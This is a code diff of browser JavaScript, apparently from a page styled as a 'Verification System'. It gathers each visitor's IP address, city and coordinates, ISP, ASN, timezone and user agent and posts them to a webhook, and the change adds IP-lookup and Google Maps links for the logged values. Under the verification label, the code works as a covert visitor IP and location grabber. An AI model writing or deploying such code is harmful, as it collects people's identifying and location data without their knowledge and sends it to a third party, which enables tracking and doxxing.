@@ -129,29 +129,42 @@
       }
 
       // Build embed with enriched details
-      const embed = {
-        username: 'Verification System',
-        embeds: [
-          {
-            title: `${geo.country_code ? String.fromCodePoint(...geo.country_code.toUpperCase().split('').map(c => 127397 + c.charCodeAt())) : ''} User Verification: ${geo.city || 'Unknown'}, ${geo.region || geo.region_name}, ${geo.country_name}`,
-            color: vpn ? 16755007 : 65280,
-            fields: [
-              { name: '🔍 Verification Status', value: vpn ? '❌ FAILED: VPN/Proxy Detected' : '✅ PASSED: No VPN Detected', inline: true },
-              { name: '📍 Location', value: `${geo.city}, ${geo.region || geo.region_name}, ${geo.country_name}`, inline: true },
-              { name: '🌐 IP Address', value: ip, inline: true },
-              { name: '🏢 ISP/Organization', value: geo.org || 'Unknown', inline: true },
-              { name: '🌍 Coordinates', value: `${geo.latitude || 'Unknown'}, ${geo.longitude || 'Unknown'}`, inline: true },
-              { name: '⚠️ Suspicious Factors', value: flags.length ? flags.join(', ') : 'None', inline: true },
-              { name: '📱 Device Info', value: navigator.userAgent, inline: false },
-              { name: '📅 Verification Time', value: new Date().toLocaleString('en-GB'), inline: false },
-              { name: '🕵️ Additional Checks', value: `ASN: ${geo.asn || 'Unknown'}\nVPN Score: ${score}\nTimezone: ${geo.timezone || 'Unknown'}`, inline: false }
-            ],
-            footer: {
-              text: `Verified at ${new Date().toLocaleString('en-GB')}`
-            }
-          }
-        ]
-      };
+     // Build embed with enriched details and clickable links
+const embed = {
+  username: 'Verification System',
+  embeds: [
+    {
+      title: `${geo.country_code ? String.fromCodePoint(...geo.country_code.toUpperCase().split('').map(c => 127397 + c.charCodeAt())) : ''} User Verification: ${geo.city || 'Unknown'}, ${geo.region || geo.region_name}, ${geo.country_name}`,
+      color: vpn ? 16755007 : 65280,
+      fields: [
+        { name: '🔍 Verification Status', value: vpn ? '❌ FAILED: VPN/Proxy Detected' : '✅ PASSED: No VPN Detected', inline: true },
+        { name: '📍 Location', value: `${geo.city}, ${geo.region || geo.region_name}, ${geo.country_name}`, inline: true },
+        { 
+          name: '🌐 IP Address', 
+          value: `[${ip}](https://iplookup.io/ip/${ip})`, // Clickable IP lookup link
+          inline: true 
+        },
+        { name: '🏢 ISP/Organization', value: geo.org || 'Unknown', inline: true },
+        { 
+          name: '🌍 Coordinates', 
+          value: `[${geo.latitude || 'Unknown'}, ${geo.longitude || 'Unknown'}](https://www.google.com/maps?q=${geo.latitude || ''},${geo.longitude || ''})`, // Clickable Google Maps link
+          inline: true 
+        },
+        { name: '⚠️ Suspicious Factors', value: flags.length ? flags.join(', ') : 'None', inline: true },
+        { name: '📱 Device Info', value: navigator.userAgent, inline: false },
+        { name: '📅 Verification Time', value: new Date().toLocaleString('en-GB'), inline: false },
+        { 
+          name: '🕵️ Additional Checks', 
+          value: `ASN: ${geo.asn || 'Unknown'}\nVPN Score: ${score}\nTimezone: ${geo.timezone || 'Unknown'}`, 
+          inline: false 
+        }
+      ],
+      footer: {
+        text: `Verified at ${new Date().toLocaleString('en-GB')}`
+      }
+    }
+  ]
+};
 
       // Send webhook
       await fetch(WEBHOOK, {
